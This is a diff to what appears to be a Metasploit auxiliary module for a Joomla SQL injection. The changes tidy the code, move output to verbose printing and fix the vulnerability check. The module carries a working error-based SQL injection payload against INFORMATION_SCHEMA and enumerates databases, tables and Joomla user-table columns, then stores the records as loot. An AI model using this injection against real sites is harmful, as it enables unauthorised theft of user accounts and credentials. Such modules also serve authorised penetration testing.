@@ -55,9 +55,10 @@ class Metasploit4 < Msf::Auxiliary
 
     if res && res.code == 500 && res.body =~ /#{lmark}#{flag}#{rmark}/
       Msf::Exploit::CheckCode::Vulnerable
+    else
+      Msf::Exploit::CheckCode::Safe
     end
 
-    Msf::Exploit::CheckCode::Safe
   end
 
   def request(query)
@@ -84,7 +85,7 @@ class Metasploit4 < Msf::Auxiliary
     0.upto(dbc.to_i - 1) do |i|
       dbname = request(query_fmt % i)
       dbs << dbname
-      print_good(dbname)
+      vprint_good(dbname)
     end
 
     %w(performance_schema information_schema mysql).each do |dbname|
@@ -107,10 +108,10 @@ class Metasploit4 < Msf::Auxiliary
     query_fmt << "WHERE table_schema IN (0x#{database.unpack('H*')[0]}) "
     query_fmt << 'LIMIT %d,1)'
 
-    print_status('tables in database: %s' % database)
+    vprint_status('tables in database: %s' % database)
     0.upto(tbc.to_i - 1) do |i|
       tbname = request(query_fmt % i)
-      print_good(tbname)
+      vprint_good(tbname)
       tbs << tbname if tbname =~ /_users$/
     end
     tbs
@@ -121,7 +122,7 @@ class Metasploit4 < Msf::Auxiliary
     query = "(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{database}.#{table})"
 
     colc = request(query)
-    print_status(colc)
+    vprint_status(colc)
 
     valid_cols = [   # joomla_users
       'activation',
@@ -158,7 +159,7 @@ class Metasploit4 < Msf::Auxiliary
         end
       end
       cols << record
-      print_status(record.to_s)
+      vprint_status(record.to_s)
     end
     cols
   end
@@ -167,19 +168,18 @@ class Metasploit4 < Msf::Auxiliary
     $lmark = Rex::Text.rand_text_alpha(5)
     $rmark = Rex::Text.rand_text_alpha(5)
 
-    $payload = ''
-    $payload << 'AND (SELECT 6062 FROM(SELECT COUNT(*),CONCAT('
+    $payload = 'AND (SELECT 6062 FROM(SELECT COUNT(*),CONCAT('
     $payload << "0x#{$lmark.unpack('H*')[0]},"
     $payload << '%s,'
     $payload << "0x#{$rmark.unpack('H*')[0]},"
     $payload << 'FLOOR(RAND(0)*2)'
     $payload << ')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'
 
-    dbs = query_databases # query databases
+    dbs = query_databases
     dbs.each do |db|
-      tables = query_tables(db)             # query tables
+      tables = query_tables(db)
       tables.each do |table|
-        cols = query_columns(db, table)     # query cokumns
+        cols = query_columns(db, table)
         next if cols.blank?
         path = store_loot(
           'joomla.users',
